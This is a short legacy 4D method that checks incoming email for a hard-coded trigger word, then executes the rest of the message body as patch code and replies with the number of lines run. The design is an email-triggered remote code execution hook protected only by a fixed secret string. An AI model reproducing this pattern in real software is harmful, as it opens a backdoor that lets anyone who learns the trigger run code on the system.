//%attributes = {"publishedWeb":true}
//PM: Email_Opt_Patch() -> 
//@author mlb - 4/17/01  13:01

C_TEXT:C284($secreteWord)
C_LONGINT:C283($position; $payLoadBeginsAt; $linesExecuted)

$secreteWord:="`Begin:"
$payLoadBeginsAt:=Length:C16($secreteWord)+1
$position:=Position:C15($secreteWord; emailBody)  //open says a me

If ($position>0)
	emailBody:=Substring:C12(emailBody; $payLoadBeginsAt)
	$linesExecuted:=util_Patch(emailBody)
	emailResponse:=String:C10($linesExecuted)+" lines executed"+Char:C90(13)+Char:C90(13)
	emailResponse:=emailResponse+emailBody
Else 
	emailResponse:="403 "
End if 